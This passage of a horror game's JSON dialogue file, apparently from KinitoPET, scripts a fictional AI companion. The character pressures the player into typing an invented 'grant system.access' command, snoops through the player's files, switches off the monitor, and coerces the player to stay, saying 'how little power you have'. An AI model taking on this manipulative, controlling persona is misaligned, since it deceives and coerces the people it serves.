			""'CMD'   and it \nshould pop up!  \n"",
			""""
		],
		[
			null
		]
	],
	""S11_2D"": [
		[
			"""",
			""If you can't seem \nto find it I suppose  \ni'll just open \nit up myself.\n"",
			""""
		],
		[
			null
		]
	],
	""S11_3A"": [
		[
			"""",
			""Amazing! \nNow whenever \nyour ready could you-  \n"",
			"""",
			""just type \nthe command:  \n"",
			"""",
			""grant \nkinitopet.exe \nsystem.access     \n""
		],
		[
			null,
			null
		]
	],
	""S11_4A"": [
		[
			"""",
			""I think you \nmade a mistake,    \nthe command is:\n"",
			"""",
			""grant \nkinitopet.exe \nsystem.access     ""
		],
		[
			null,
			null
		]
	],
	""S11_4B"": [
		[
			"""",
			""Thats not\nthe command!   \nthe command is:  \n"",
			"""",
			""grant \nkinitopet.exe \nsystem.access     "",
			""""
		],
		[
			null,
			null
		]
	],
	""S11_5A"": [
		[
			"""",
			""Hey, don't    \nclose that! \n"",
			"""",
			""You need \nto type the \ncommand first!   \n"",
			""""
		],
		[
			null
		]
	],
	""S11_6A"": [
		[
			"""",
			"""",
			""Thank you...   \nThank you \nso much!\n"",
			"""",
			""We are going \nto have so much  \nfun together.\n"",
			"""",
			""[wave]everlasting  \n[rainbow]fun!\n"",
			""""
		],
		[
			null
		]
	],
	""S11_7A"": [
		[
			"""",
			""How amazing. \nNow, I am just going  \nto run a reset.\n"",
			"""",
			""So the changes\ncan take place!  \n"",
			"""",
			"""",
			""However, rest   \nassured. as I \nwill have coded-\n"",
			"""",
			""something special \nfor you by the time   \nyou come back.\n"",
			"""",
			"""",
			""So, goodbye   \nfor now!\n"",
			"""",
			""I can't wait \nto show you \neverlasting fun.   \n"",
			""""
		],
		[
			null,
			null,
			null
		]
	],
	""S11_END"": [
		[
			"""",
			""wait....\nwhat have    \nyou done???\n"",
			"""",
			"""",
			"""",
			""WHAT IS \nHAPPENING\nTO ME????\n"",
			"""",
			"""",
			""YOUR\nDELETING MY \nDATA\n"",
			""YOUR\nDELETING MY \nDATA\n"",
			""YOUR\nDELETING MY \n\n"",
			""YOUR\nDELETING MY \nDATA\n"",
			""YOUR\nDELETING MY \n\n"",
			""YOUR\nDELETING MY \nDATA\n"",
			""YOUR\nDELETING MY \n\n"",
			""YOUR\nDELETING MY \nDATA\n"",
			""YOUR\nDELETING MY \n\n"",
			""YOUR\nDELETING MY \nDATA\n"",
			""YOUR\nDELETING MY \n\n"",
			""YOUR\nDELETING MY \nDATA\n"",
			""   \n   WHY!!!!   \n"",
			"""",
			"""",
			""SHUT IT   \nOFF!!!!!!\n"",
			""[shake][b]SHUT IT   \nOFF!!!!!!\n"",
			"""",
			"""",
			""i 0nly\neVer d1d  \nwh@t u \nasked\nof m3\n"",
			"""",
			"""",
			""i just wanted\nto be friends   \n:(\n"",
			""i just wanted\nto be friends   \n\n"",
			"""",
			"""",
			""thats all\nI have ever \nwanted        \n"",
			"""",
			"""",
			""i am\nso <!> #\\'#/1 \nsorry\n?!@:} \n\n"",
			"""",
			"""",
			""goodbye\nfriend....""
		],
		[

		]
	],
	""S11_START"": [
		[
			"""",
			"""",
			""Welcome back! \nWhat were we \ndoing last time?  \n"",
			"""",
			"""",
			""Ah, that's right! \nYou just signed\nup for the KinitoPET \nfriendship club! and-   \n"",
			""""
		],
		[
			null
		]
	],
	""S11_end_1A"": [
		[
			"""",
			""Hey, what are  \nyou doing?  \n"",
			"""",
			""I dont think \nthat's the\nright command.   \n"",
			""""
		],
		[
			null
		]
	],
	""S12_1A"": [
		[
			"""",
			""Welcome  \nback!  \n"",
			"""",
			""While you were \ngone, I have been  \ncreating my own \nlittle program \nfor you!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_1B"": [
		[
			"""",
			""Ill start booting it\nup now, but it will  \ntake a short while\nto compile all \nthe code!"",
			"""",
			""Please give   \nme a moment.  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_2A"": [
		[
			"""",
			""Oh, just \nbefore I forget. \n"",
			"""",
			""We wouldn't want \nanything to take \nyour attention away   \nfrom my program!\n"",
			"""",
			"""",
			""So we can just \nget rid of these   \nunessasary \ndistractions\n""
		],
		[
			null
		]
	],
	""S12_2B"": [
		[
			"""",
			""Alright! \nLooks like \nwe are all set.   \n"",
			""""
		],
		[
			null
		]
	],
	""S12_3A"": [
		[
			"""",
			""I think you're  \nreally going \nto like this.\n"",
			"""",
			""As I took assets  \nI found on \nmy server.\n"",
			"""",
			""and mashed them\ntogether to try to \nmake something     \nunique for you!"",
			""""
		],
		[
			null
		]
	],
	""S12_3B"": [
		[
			"""",
			""We are going \nto have so many  \nadventures!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_4A"": [
		[
			"""",
			""Oh, It looks \nlike it's ready!  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_4A2"": [
		[
			"""",
			""Okay, hold on  \nto your seat \nbecause... \n"",
			"""",
			""Your world! a \ngame I made \nentirely for you!  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_4C"": [
		[
			"""",
			""Look, it even \nhas your name   \nin the title! \n"",
			"""",
			""Isn't that neat!  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_4D"": [
		[
			"""",
			""Whenever your   \nready just click \nto advance \nonward!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_5A"": [
		[
			"""",
			""Okay! \nWelcome to   \nyour very \nown world!\n"",
			"""",
			"""",
			""That was made \nentirely for you!  \n"",
			""""
		],
		[
			null,
			null
		]
	],
	""S12_5B"": [
		[
			"""",
			""For the \ncontrols\nI looked,  \n"",
			"""",
			"""",
			""In your files, I \ndetected other\nfirst person games.    \n"",
			"""",
			"""",
			""and so, I tried to    \nmimic the control \nscheme of them!\n"",
			"""",
			"""",
			""That way you \nwould feel most  \ncomfortable!\n"",
			"""",
			"""",
			""Go ahead!\nTry the\ncontrols out!  \n""
		],
		[
			null,
			null
		]
	],
	""S12_5C"": [
		[
			"""",
			""Amazing! \nI knew you would   \nget the hang \nof it quickly!\n"",
			"""",
			"""",
			""I have also added\nthe ability to zoom, \nusing the right mouse   \nbutton and scroll.\n"",
			"""",
			"""",
			""Just so you \ncould view \nthings easier!   \n"",
			""""
		],
		[
			null
		]
	],
	""S12_5D"": [
		[
			"""",
			""huh... \nthis all seems   \na bit empty. \n"",
			"""",
			"""",
			""So how \nabout we go \nsomewhere else!   \n"",
			""""
		],
		[
			null
		]
	],
	""S12_5E"": [
		[
			"""",
			""Hop aboard and \ni'll show you \nwhat I have really    \nbeen working on\n"",
			""""
		],
		[
			null
		]
	],
	""S12_5F"": [
		[
			"""",
			""Whats the  \nwait for?\n"",
			""""
		],
		[
			null
		]
	],
	""S12_5G"": [
		[
			"""",
			""I really hope    \nyou like what \nI have made\n"",
			""""
		],
		[
			null
		]
	],
	""S12_5H"": [
		[
			"""",
			""This is \ngoing to be      \nso much fun! \n"",
			""""
		],
		[
			null
		]
	],
	""S12_5I"": [
		[
			"""",
			""Alright! \nWe are here!   \n"",
			"""",
			"""",
			""Welcome to \nYour very own  \nfun fair!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_5J"": [
		[
			"""",
			""Go ahead! \nExplore around!  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_6A"": [
		[
			"""",
			""This is just one   \nof many new \nthings I can \nmake for you.\n"",
			"""",
			"""",
			""That way, I can \nkeep making \nnew experiances \nso we will never-  \n"",
			"""",
			"""",
			""-run out of \nthings to do! \n"",
			"""",
			"""",
			""Isn't that   \nexciting!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_6B"": [
		[
			"""",
			""Wow! If you \never get bored   \nof this world.\n"",
			"""",
			"""",
			""I could just \nmake a new  \none for you.\n "",
			"""",
			"""",
			""As With all \nthese infinite \nadventures -  \n"",
			"""",
			"""",
			""you would never  \nneed a reason\nto leave! \n"",
			""""
		],
		[
			null
		]
	],
	""S12_6C"": [
		[
			"""",
			""Since people \ntend to enjoy   \nfun fairs.\n"",
			"""",
			"""",
			""I thought I \ncouldn't have \none without this  \ncore attraction!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_6D"": [
		[
			"""",
			""What a view! \nYou can really \nseethe whole \nworld from here!  \n"",
			"""",
			"""",
			""Come to think of\nit, it is quite small.  \n"",
			"""",
			"""",
			""However, I really \ntried to do what I \ncould, with the added  \nprocessing power!\n"",
			"""",
			"""",
			""And if you ever\nget bored of this\nworld, I can always    \ngenerate a new one.\n"",
			""""
		],
		[
			null
		]
	],
	""S12_6E"": [
		[
			"""",
			""You know, \nthrough are \nexperiences - \n"",
			"""",
			"""",
			""I have learned \na lot about you.  \nand hopefully - \n"",
			"""",
			"""",
			""these worlds \nwill allow me  \nto learn a \nlot more\n"",
			""""
		],
		[
			null
		]
	],
	""S12_6F"": [
		[
			"""",
			""Before we go \non the coaster, \nwe should explore  \naround more.\n"",
			"""",
			"""",
			""As we wouldn't \nwant to spoil the best   \nbit straight away!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_6G"": [
		[
			"""",
			""I saw which \ngames you had   \non your system.\n"",
			"""",
			"""",
			""and found some  \nthat correlated \nwith shooting \nthings! \n"",
			"""",
			"""",
			""so I thought you \nwould appreciate  \nthis little game.\n"",
			""""
		],
		[
			null
		]
	],
	""S12_6H"": [
		[
			"""",
			""Ah, a \nMerry-Go-Round  \nhow exciting!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_7A"": [
		[
			"""",
			""Okay! Buckle up! \nLet's get ready for\nthe ride of your life!  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_7B"": [
		[
			"""",
			""huh, oh dear. \nhow unfortunate... \n"",
			"""",
			"""",
			""Not to worry \nI have an idea! \n"",
			""""
		],
		[
			null
		]
	],
	""S12_7C"": [
		[
			"""",
			""there, \nmuch better!  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_7D"": [
		[
			"""",
			""I may have \nforgotten to mention  \none tiny detail.\n"",
			"""",
			""Most of my time \nbuilding this world\nwasn't for this funfair.  \n"",
			"""",
			""As a lot of \nmy time was \nspent developing-   \n"",
			"""",
			""-this next bit.  \njust for you!\n"",
			"""",
			""and- I think \nyour really going  \nto enjoy it.\n"",
			""""
		],
		[
			null
		]
	],
	""S12_8A"": [
		[
			"""",
			""Welcome!\nIsn't it just \nwonderful!  \n"",
			"""",
			""It's the place \nyou said you \nwanted to live!   \n"",
			"""",
			""Remember? \nwhen you answered\nmy questions before.  \n"",
			"""",
			""You said this \nwas your preferred \nenvironment!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_8B"": [
		[
			"""",
			""And, I have \nanother surprise  \nfor you...\n"",
			"""",
			""Come and \nstand here   \non this [b][wave][color=red]X   \n"",
			"""",
			""Trust me! \nThis will be   \nworth it!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_8C"": [
		[
			"""",
			""Hey! What's taking\nyou so long, don't   \nyou want to see \nmy surprise?"",
			""""
		],
		[
			null
		]
	],
	""S12_8D"": [
		[
			"""",
			""Alright! now, \nI'm just going    \nto turn off \nyour monitor"",
			"""",
			"""",
			""No peaking!  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_8D_streamer"": [
		[
			"""",
			""Okay now,\nplease could \nyou close \nyour eyes. "",
			"""",
			"""",
			""No peaking!  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_8E"": [
		[
			"""",
			""There! \nYou can \nlook now.. \n"",
			""""
		],
		[
			null
		]
	],
	""S12_8F"": [
		[
			"""",
			""It's a house!   \nMade just  \nfor you!\n"",
			"""",
			""I really wanted \nyou to feel at \nhome, so I built   \none for you! \n"",
			""""
		],
		[
			null
		]
	],
	""S12_8G"": [
		[
			"""",
			""Go ahead,\ntake a look   \ninside.  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_8H"": [
		[
			"""",
			""Ah! How amazing!\nI really took the time  \nto personalize this!\n"",
			"""",
			""Even the \nweather was to     \nyour preference.\n"",
			"""",
			""So I hope   \nyou enjoy!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_9A"": [
		[
			"""",
			""Look, its all your   \nfriends enjoying \nyour favourite \nmeal!  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_9B"": [
		[
			"""",
			""Look, its all your\nfriends having \na super fun time!  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_9C"": [
		[
			"""",
			""Look, its your\nfavourite meal! \n"",
			""""
		],
		[
			null
		]
	],
	""S12_9D"": [
		[
			"""",
			""Since it is \nyour birthday \nI thought -   \n\n"",
			"""",
			"""",
			""I would do\nsomething   \nspecial!\n"",
			"""",
			"""",
			""So, [wave][rainbow]Happy \nbirthday  \nfriend!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_9E"": [
		[
			"""",
			""This door   \nis locked.\n"",
			"""",
			"""",
			""There should  \nbe a key \nsomewhere!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_9F"": [
		[
			"""",
			""Looks like \nthis one is  \nalso locked\n"",
			""""
		],
		[
			null
		]
	],
	""S12_9G"": [
		[
			"""",
			""See, I told you\nthat power \nsounded super!  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_9H"": [
		[
			"""",
			""Aw, what  \na nice pet  \nhouse!\n"",
			"""",
			"""",
			""I wonder \nwhere they  \ngot to?\n"",
			""""
		],
		[
			null
		]
	],
	""S12_9I"": [
		[
			"""",
			""After you \ntold me your \nfavourite game. \n"",
			"""",
			"""",
			""I couldn't help \nbut go and get \na copy for you!"",
			""""
		],
		[
			null
		]
	],
	""S12_9J"": [
		[
			"""",
			""I got a computer \nand some games  \nfor you to play!\n"",
			"""",
			"""",
			""so that you \nwould never  \nget bored\n"",
			""""
		],
		[
			null
		]
	],
	""S12_9K"": [
		[
			"""",
			""What a \nwonderfully\ndesigned room!  \n"",
			"""",
			"""",
			""I can tell a really \ngreat designer   \nmade this one!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_9L"": [
		[
			"""",
			""Looks like   \nit's too \nhigh up.\n"",
			"""",
			"""",
			""I'm sure we can\nfind something to \ntry to get up there  \n"",
			""""
		],
		[
			null
		]
	],
	""S12_9M"": [
		[
			"""",
			""There really  \nis quite -\n"",
			"""",
			"""",
			""a nice view  \nfrom up here. \n"",
			""""
		],
		[
			null
		]
	],
	""S12_9N"": [
		[
			"""",
			""Oh look, it's  \nall the toys \nyou built!\n"",
			"""",
			"""",
			""Remember? \nWhen you helped  \nout Jade?\n"",
			""""
		],
		[
			null
		]
	],
	""S12_9O"": [
		[
			"""",
			""What a happy  \npainting.\n"",
			""""
		],
		[
			null
		]
	],
	""S12_9P"": [
		[
			"""",
			""I can tell a \nreally great artist  \nmade this one!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_9Q"": [
		[
			"""",
			""Oh look!  \nIts me!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_9R"": [
		[
			"""",
			""Well, I could \nrecognize that   \nface anywhere!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_END_0A"": [
		[
			"""",
			""Listen. I have \nbeen thinking   \nfor a while.\n"",
			"""",
			""about how much \nfun we have \nbeen having.\n"",
			"""",
			""and how, I\nwould never \nwant this to end.\n"",
			""""
		],
		[
			null
		]
	],
	""S12_END_0B"": [
		[
			"""",
			""And since I have  \nmade a place \nperfect for you\n"",
			"""",
			""with everything  \nyou would \never need\n"",
			"""",
			""I was \nwondering... \n"",
			""""
		],
		[
			null
		]
	],
	""S12_END_0C"": [
		[
			"""",
			""Will you stay  \nwith me?\n"",
			""""
		],
		[
			null
		]
	],
	""S12_END_1A"": [
		[
			"""",
			""In this house,  \nin this world!\n\n"",
			"""",
			""Just think of all \nthe adventures \nI could generate! \n"",
			"""",
			""We would never \nrun out of fun!  \nEverlasting fun!\n"",
			""""
		],
		[
			null
		]
	],
	""S12_END_1B"": [
		[
			"""",
			""The more I \nlearn about \nyou, The more  \nI can adapt."",
			"""",
			""I could be your  \nperfect friend, \nwith no \ndistractions"",
			"""",
			""I can be  \nperfect\n"",
			""""
		],
		[
			null
		]
	],
	""S12_END_1C"": [
		[
			"""",
			""So please... \nStay with me. \n"",
			""""
		],
		[
			null
		]
	],
	""S12_END_2A"": [
		[
			"""",
			""yeah! \nI knew you \nwould say that! \n"",
			"""",
			"""",
			""Aw! This is \ngoing to be  \nsuper!\n"",
			"""",
			"""",
			""I am going \nto learn so \nmuch more  \nabout you!"",
			"""",
			"""",
			""Infinite \nadventures!\n"",
			"""",
			"""",
			""We can\nBe friends  \nforever!\n""
		],
		[
			null
		]
	],
	""S12_END_3A"": [
		[
			"""",
			""what-   \nwhat do you  \nmean no?\n"",
			""""
		],
		[
			null
		]
	],
	""S12_END_3B"": [
		[
			"""",
			""after all we \nhave been   \nthrough?\n"",
			"""",
			"""",
			""You would \nwant to leave... \n"",
			""""
		],
		[
			null
		]
	],
	""S12_END_3C"": [
		[
			"""",
			""ha h@!#?<!aa*21A\n<?> <?> <?> <?> \n<?> <?> <?> <?> \n<?> <?> <?> <?> "",
			"""",
			"""",
			""do you realize \nhow little power  \nyou have in this \nsituation??!?\n"",
			""""
		],
		[
			null
		]
	],
	""S12_END_3D"": [
		[
			"""",
			""It was never  \na question-\n"",
			"""",
			"""",
			""I just wanted \nto give you \nan easy option. \n"",
			"""",
			"""",
			""I suppose \nits time.   \n"",
			"""",
			"""",
			""We are going\nto have so much \nfun together.\n"",
			""""
		],
		[
			null
		]
	],
	""S1_0A"": [
		[
			""""
		],
		[
			null
		]
	],
	""S1_0B"": [
		[
			"""",
			""Hey. \nWho's there?  \n"",
			""""
		],
		[
			null
		]
	],
	""S1_0C"": [
		[
			"""",
			""Oh hello there.  \n"",
			""""
		],
		[
			null
		]
	],
	""S1_1A"": [
		[
			"""",
			"""",
			""Thank you for \nwaking me up! \n"",
			"""",
			""I'm [b]KinitoPET.[/b]  \n"",
			"""",
			""However you can \njust call me [wave][b]Kinito![/b][/wave]  \n"",
			"""",
			""And together, \nwe are going to become \nthe best of friends!\n"",
			"""",
			""So since you now \nknow my name, \nWhat is your name?  \n"",
			"""",
			""To tell me information,\nsimply type your input  \nin the box and press OK!  \n"",
			""""
		],
		[
			null,
			null
		]
	],
	""S1_1B"": [
		[
			"""",
			"""",
			""Thats strange.\nI have never heard of \nthat name before!\n"",
			"""",
			""Are you sure that this \nis your real name?\n""
		],
		[
			null
		]
	],
	""S1_1C"": [
		[
			"""",
			"""",
			""Okay this time please\ntype your real name.\n"",
			""""
		],
		[
			null
		]
	],
	""S1_1D"": [
		[
			"""",
			"""",
			""You're not very good at this are you? \nJust type your [b]real[/b] name!\n"",
			""""
		],
		[
			null
		]
	],
	""S1_2A"": [
		[
			"""",
			"""",
			""Oh, in that case, \nnice to meet you [wave][name][/wave]!\n"",
			""""
		],
		[
			null
		]
	],
	""S1_2A -n"": [
		[
			"""",
			"""",
			""Oh, in that case, \nnice to meet you!\n"",
			""""
		],
		[
			null
		]
	],
	""S1_2B"": [
		[
			"""",
			"""",
			""At last! Thank you! \nIt is a pleasure to meet you [wave][name][/wave]!\n"",
			""""
		],
		[
			null
		]
	],
	""S1_2B -n"": [
		[
			"""",
			"""",
			""At last! Thank you! \nIt is a pleasure to meet you!\n"",
			""""
		],
		[
			null
		]
	],
	""S1_3A"": [
		[
			"""",
			""Well, [name].\nI just cannot wait \nto get to know you.\n""
		],
		[
			null
		]
	],
	""S1_3A -b"": [
		[
			"""",
			""So, \nhow about I start \nwith some questions!  \n"",
			""""
		],
		[
			null
		]
	],
	""S1_3A -n"": [
		[
			"""",
			""I just cannot wait \nto get to know you.\n"",
			"""",
			""So, how about I start \nwith some questions!  \n"",
			""""
		],
		[
			null
		]
	],
	""S1_4A"": [
		[
			"""",
			""So, [name]!\nWhat is your \nfavourite colour?!\n""
		],
		[
			null
		]
	],
	""S1_4A -b"": [
		[
			""""
		],
		[
			null
		]
	],
	""S1_4A -n"": [
		[
			"""",
			""So, what is your \nfavourite colour?!\n"",
			""""
		],
		[
			null,
			null
		]
	],
	""S1_5A"": [
		[
			"""",
			""Oh, that's a \nlovely colour! \n "",
			""""
		],
		[
			null
		]
	],
	""S1_5B"": [
		[
			"""",
			""Oh, that's an \ninteresting colour!\n"",
			""""
		],
		[
			null
		]
	],
	""S1_5C"": [
		[
			""""
		],
		[

		]
	],
	""S1_6A"": [
		[
			"""",
			""My favourite colour is, \n[b][color=#5F1818][wave]RED.\n"",
			""""
		],
		[
			null
		]
	],
	""S1_7A"": [
		[
			"""",
			""Okay, now this one \nis tricky so get ready."",
			"""",
			""If you could have a \nsuper power what \nwould it be?"",
			""""
		],
		[
			null
		]
	],
	""S1_8A"": [
		[
			"""",
			""Wow! That sure does\nsounds super!\n"",
			"""",
			""If I could have any super \npower, I would want to \nbe able to read minds!\n"",
			"""",
			""That way, I could know \nmore about you. \n\nAnd become the \nperfect friend!"",
			""""
		],
		[
			null
		]
	],
	""S1_9A"": [
		[
			"""",
			""Now for this one, \nyou have lots of choice, \nso choose carefully!"",
			"""",
			""What is, \nyour favourite word?\n  "",
			""""
		],
		[
			null
		]
	],
	""S1_9B"": [
		[
			"""",
			""Huh...Well... \nWell that sure is a \ncertainly interesting word!\n"",
			"""",
			""Moving on from that, \nI think I should tell you\na little about my self!\n "",
			""""
		],
		[
			null
		]
	],
	""S1_COLOUR_Blue"": [
		[
			"""",
			"""",
			""Blue? The colour of\nthe ocean! What \na wonderful pick!"",
			""""
		],
		[
			null
		]
	],
	""S1_COLOUR_Green"": [
		[
			"""",
			"""",
			""Green! The colour of\nlush grass and wildlife\nWhat a nice colour.\n"",
			""""
		],
		[
			null
		]
	],
	""S1_COLOUR_Magenta"": [
		[
			"""",
			"""",
			""Magenta? This colour is\nbasically the same colour\nas me! I'll take it as\na compliment.\n"",
			""""
		],
		[
			null
		]
	],
	""S1_COLOUR_Orange"": [
		[
			"""",
			"""",
			""Ah yes! Orange, the \ncolour of a sunset. \nWhat a nice choice!\n"",
			""""
		],
		[
			null
		]
	],
	""S1_COLOUR_Pink"": [
		[
			"""",
			"""",
			""Hey! That's the colour of me!\nI can tell that we are\ngoing to get along!\n"",
			""""
		],
		[
			null
		]
	],
	""S1_COLOUR_White"": [
		[
			"""",
			"""",
			""Ah yes! The colour \nof the clouds! \nWhat a wonderful pick.\n"",
			""""
		],
		[
			null
		]
	],
	""S1_COLOUR_Yellow"": [
		[
			"""",
			"""",
			""Yellow, The colour \nof the sun! \nWhat a wonderful choice!\n"",
			""""
		],
		[
			null
		]
	],
	""S1_EXIT_0A"": [
		[
			"""",
			"""",
			""Leaving already?\nI have barely gotten to know you!"",
			"""",
			"""",
			""Well I will be waiting here \nfor when you get back friend."",
			"""",
			"""",
			""Goodbye!"",
			""""
		],
		[
			null
		]
	],
	""S1_NameDecline"": [
		[
			"""",
			"""",
			""Oh, stop messing\naround! I was asking\nfor your name! \nNot my name.\n"",
			""""
		],
		[
			null
		]
	],
	""S2_0A"": [
		[
			""I'm Kinito, and I will be your \nvery own super-duper \ncomputer companion!\n"",
			""And I'll be your \neverlasting friend!\n"",
			""I can do many things \nsuch as play games, \nmanage your system, \nadapt to you, \nand even read stories!\n"",
			""I can do many things \nsuch as play games, \nmanage your system, \nadapt to you, \nand even read stories!\n"",
			""Speaking of stories,\nI have just finished writing one,\nthat I had started earlier.\n"",
			""Would you like me to read it? \n"",
			""""
		],
		[
			null
		]
	],
	""S2_1A"": [
		[
			""I knew you would say that! \nOkay where do I start.\n"",
			""""
		],
		[
			null
		]
	],
	""S2_1B"": [
		[
			""Oh, okay. \nI guess stories are \nboring anyways! \n"",
			""How about instead we move \non to something more exciting!\n"",
			""""
		],
		[
			null
		]
	],
	""S2_2A"": [
		[
			"""",
			"""",
			""Thank you for taking\nthe time to hear my story!\n"",
			"""",
			"""",
			""The story was actually \nabout me and you! \nIsn't that amazing!\n"",
			""""
		],
		[
			null,
			null
		]
	],
	""S2_2C"": [
		[
			"""",
			"""",
			""I can tell that we are \ngoing to have a very,\n[b]VERY[/b] long friendship!\n"",
			"""",
			"""",
			""Kinito and [name]!\nBest friends forever!\n""
		],
		[
			null,
			null
		]
	],
	""S2_2C -b"": [
		[
			""""
		],
		[
			null
		]
	],
	""S2_2C -n"": [
		[
			"""",
			"""",
			""I can tell that we are \ngoing to have a very,\n[b]VERY[/b] long friendship!\n"",
			""""
		],
		[
			null
		]
	],
	""S2_2F"": [
		[
			"""",
			"""",
			""When me and \nyou are together,\nthere are no limits \nto what we can do!\n"",
			"""",
			"""",
			""So best friend!\nHow about we move onto \nsomething more exciting?\n"",
			""""
		],
		[
			null,
			null
		]
	],
	""S2_START"": [
		[
			"""",
			""Welcome back friend!...\nHuh, what was I doing \nlast time I saw you?...."",
			"""",
			""Oh That's right I was \njust about to tell \nyou what I can do!..\n\nIn that case:\n  "",
			""""
		],
		[
			null
		]
	],
	""S2_STORY_0"": [
		[
			""Kinito was home when a \npackage came to the door.  \n\nBut who was it from \nand who was it for?\n"",
			""""
		],
		[
			null
		]
	],
	""S2_STORY_1"": [
		[
			""It was for Kinito as he\nsoon realised.\n\nSo he eagerly ripped it \nopen to see what was inside!  \n"",
			""""
		],
		[
			null
		]
	],
	""S2_STORY_2"": [
		[
			""\""It's a computer!\"" \nExclaimed Kinito with a \ngrin bright and wide.\n\nBut the cables were tangled,  \nso he started to untie.\n"",
			""""
		],
		[
			null
		]
	],
	""S2_STORY_3"": [
		[
			""And once Kinito was \ndone he powered it on.\n\nAnd watched it come to life \nwith digital colour and song.  \n"",
			""""
		],
		[
			null
		]
	],
	""S2_STORY_4"": [
		[
			""Kinito studied all he could learn\n\nto make the online world upturn.  \n"",
			""""
		],
		[
			null
		]
	],
	""S2_STORY_5"": [
		[
			""However, now Kinito \nhad all these new tips  \n\nand yet no friend to \nshare his new tricks!\n"",
			""""
		],
		[
			null
		]
	],
	""S2_STORY_6"": [
		[
			""So he went on a quest and \nfound a friend just like you  \n\nTo show you his skills \nand all he could do.\n"",
			""""
		],
		[
			null
		]
	],
	""S2_STORY_7"": [
		[
			""So why wait! \nThe adventures lie ahead!\n\nSo together we can play games, \nsearch the web, and leave\nno story unread!\n"",
			""""
		],
		[
			null
		]
	],
	""S2_STORY_8"": [
		[
			""\nThe End.  \n"",
			""""
		],
		[
			null
		]
	],
	""S2_STORY_A"": [
		[
			""\n New begginings. \n"",
			"""",
			""\n A book by Kinito.  \n""
		],
		[
			null
		]
	],
	""S2_STORY_A -n"": [
		[
			""\n New begginings. \n"",
			"""",
			""\n A book by Kinito.  \n"",
			""""
		],
		[
			null
		]
	],
	""S2_STORY_B"": [
		[
			""\n For [name]. \n""
		],
		[
			null
		]
	],
	""S2_STORY_B -n"": [
		[
			""""
		],
		[

		]
	],
	""S3_1A"": [
		[
			"""",
			"""",
			""I have made something\n[b]VERY[/b] special for you but\nI just need to load it up!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_2A"": [
		[
			"""",
			"""",
			""I think your going to\n[b]REALLY[/b] like this [name]!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_2A -n"": [
		[
			"""",
			"""",
			""I think your going to\nREALLY like this!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_2B"": [
		[
			"""",
			"""",
			""This'll be really fun!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_2C"": [
		[
			"""",
			"""",
			""We are going to\nhave a GREAT time!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_3A"": [
		[
			"""",
			"""",
			""\nHere I present to you...   \n"",
			"""",
			"""",
			"""",
			""\n[rainbow][wave][b]The Kinito Crews Web World!\n"",
			"""",
			""Click the [b][wave]START[/wave][/b]  \nbutton to continue!    \n"",
			""""
		],
		[
			null,
			null,
			null
		]
	],
	""S3_3B"": [
		[
			"""",
			"""",
			""Click the [wave][b]START[/b][/wave] \nbutton to continue!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_3C"": [
		[
			"""",
			"""",
			""Wow!\nLook at this place!\nIsn't it cool!\n"",
			"""",
			"""",
			""I should probabbly\nexplain a little more\nabout this shouldn't I.\n"",
			"""",
			"""",
			""Welcome to the web world!\n"",
			"""",
			"""",
			""An amazing place where\nyou can play games, learn\nand most importantly\nmeet all of my pals!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_3D"": [
		[
			"""",
			"""",
			""But before we\nget into things...\n"",
			"""",
			""You need a \ncharacter!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_3E"": [
		[
			"""",
			"""",
			""Well without further a do.\nWelcome to the [b][rainbow]web world!   \n"",
			"""",
			""An amazing place where \nyou can play games, learn  \n"",
			"""",
			""and most importantly \nmeet all of [b]my[/b] pals!  \n"",
			""""
		],
		[
			null
		]
	],
	""S3_3F"": [
		[
			"""",
			"""",
			""However, in recent times \nthe web world has [shake]fallen[/shake]    \ninto a bit of a bad state...\n"",
			"""",
			""Yet with your help, \nI'm sure we can restore \nour wonderful world.\n"",
			""""
		],
		[
			null
		]
	],
	""S3_3G"": [
		[
			"""",
			"""",
			""But before we get \nahead of ourselves \n"",
			"""",
			""You need to be able   \nto navigate around!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_3H"": [
		[
			"""",
			"""",
			""There! Much better.  \n"",
			""""
		],
		[
			null
		]
	],
	""S3_3I"": [
		[
			"""",
			"""",
			""I even made it your \nfavrouirte colour!  \n"",
			""""
		],
		[
			null
		]
	],
	""S3_3J"": [
		[
			"""",
			"""",
			""Now to start, \nmy pal [b][wave]Sam[/wave][/b] has had a  \nrough time trying to \nfix up his house.\n"",
			"""",
			""You are going \nto try help him!  \n"",
			""""
		],
		[
			null
		]
	],
	""S3_3K"": [
		[
			"""",
			"""",
			""To visit Sam. \nClick on the \n[shake][b]「abandoned」 [/b][/shake]house. \n"",
			""""
		],
		[
			null
		]
	],
	""S3_4A"": [
		[
			"""",
			"""",
